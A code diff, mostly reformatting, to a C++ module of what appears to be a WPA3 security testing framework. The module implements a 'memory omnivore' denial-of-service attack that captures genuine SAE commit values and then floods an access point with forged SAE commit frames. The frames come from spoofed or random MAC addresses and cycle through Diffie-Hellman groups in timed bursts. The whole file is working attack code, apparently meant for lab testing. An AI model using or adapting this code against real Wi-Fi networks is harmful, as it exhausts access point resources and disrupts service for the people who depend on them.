@@ -3,58 +3,59 @@
 #include <random>
 #include <tins/tins.h>
 
-#include "attacks/DoS_hard/dos_helpers.h"
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
+#include "attacks/DoS_hard/dos_helpers.h"
 #include "config/RunStatus.h"
 #include "ex_program/external_actors/ExternalConn.h"
 #include "ex_program/hostapd/hostapd.h"
 #include "ex_program/hostapd/hostapd_helper.h"
 #include "logger/log.h"
 #include "observer/resource_checker.h"
-#include "system/hw_capabilities.h"
 #include "system/firmware/ath9k_htc.h"
+#include "system/hw_capabilities.h"
 
 using namespace std;
 using namespace Tins;
 using namespace chrono;
 
-namespace wpa3_tester::memory_omnivore{
-static constexpr uint16_t DH_GROUPS[] = {19, 20, 21};
+namespace wpa3_tester::memory_omnivore {
+static constexpr uint16_t DH_GROUPS[] = { 19, 20, 21 };
 static constexpr size_t N_DH_GROUPS = size(DH_GROUPS);
 
-static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, const bool use_connected_stas){
+static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, const bool use_connected_stas) {
 	vector<HWAddress<6>> pool;
 	const auto attacker_mac = rs.get_actor("attacker").get(SK::mac);
-	if(use_connected_stas){
+	if(use_connected_stas) {
 		pool = dos_helpers::get_connected_stas(rs);
 		pool.resize(min(static_cast<int>(pool.size()), pool_size));
 
-		if(static_cast<int>(pool.size()) < pool_size){
-			log(LogLevel::WARNING, "Only {} connected STAs available (need {}), padding with random MACs", pool.size(),
-				pool_size);
-			while(static_cast<int>(pool.size()) < pool_size) pool.emplace_back(firmware::get_random_ath_masker_mac(attacker_mac));
-		} else{
+		if(static_cast<int>(pool.size()) < pool_size) {
+			log(LogLevel::WARNING,
+					"Only {} connected STAs available (need {}), padding with random MACs",
+					pool.size(),
+					pool_size);
+			while(static_cast<int>(pool.size()) < pool_size)
+				pool.emplace_back(firmware::get_random_ath_masker_mac(attacker_mac));
+		} else {
 			log(LogLevel::INFO, "Using {} connected STA MACs", pool_size);
 		}
 		return pool;
 	}
 
 	pool.reserve(pool_size);
-	for(int i = 0; i < pool_size; ++i)
-		pool.emplace_back(firmware::get_random_ath_masker_mac(attacker_mac));
+	for(int i = 0; i < pool_size; ++i) pool.emplace_back(firmware::get_random_ath_masker_mac(attacker_mac));
 	log(LogLevel::INFO, "Using {} random MACs", pool_size);
 	return pool;
 }
 
-void run_attack(RunStatus &rs){
+void run_attack(RunStatus &rs) {
 	const ActorPtr attacker = rs.get_actor("attacker");
 	const ActorPtr ap = rs.get_actor("ap");
 
 	// Capture real scalar+element via wpa_supplicant before switching to monitor
 	log(LogLevel::INFO, "Capturing SAE commit values...");
 	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
-		rs, attacker.get(SK::iface), attacker.get_mon_iface(), hostapd::get_ssid(rs, "ap"),
-		ap.get(SK::mac), 30);
+			rs, attacker.get(SK::iface), attacker.get_mon_iface(), hostapd::get_ssid(rs, "ap"), ap.get(SK::mac), 30);
 
 	if(!sae_params.has_value()) throw run_err("Failed to capture SAE commit values");
 
@@ -84,20 +85,20 @@ void run_attack(RunStatus &rs){
 
 	size_t mac_idx = 0;
 	rs.process_manager.write_log_all(ATTACK_START_tag);
-	dos_helpers::timed_burst(sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL,
-							[&]() ->optional<RadioTap>{
-								const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
-								++mac_idx;
-								sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
-								return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
-							});
+	dos_helpers::timed_burst(
+			sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL, [&]() -> optional<RadioTap> {
+				const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
+				++mac_idx;
+				sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
+				return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
+			});
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	ap->conn->disconnect();
 }
 
-void stats_attack(const RunStatus &rs){
+void stats_attack(const RunStatus &rs) {
 	vector<unique_ptr<GraphElements>> elements;
-	rs.log_events(elements, {DISCONNECT, CONNECT, TESTER_TAGS});
+	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
 	observer::resource_checker::create_graph(rs, rs.get_actor("ap").get(SK::source), elements);
 }
 }
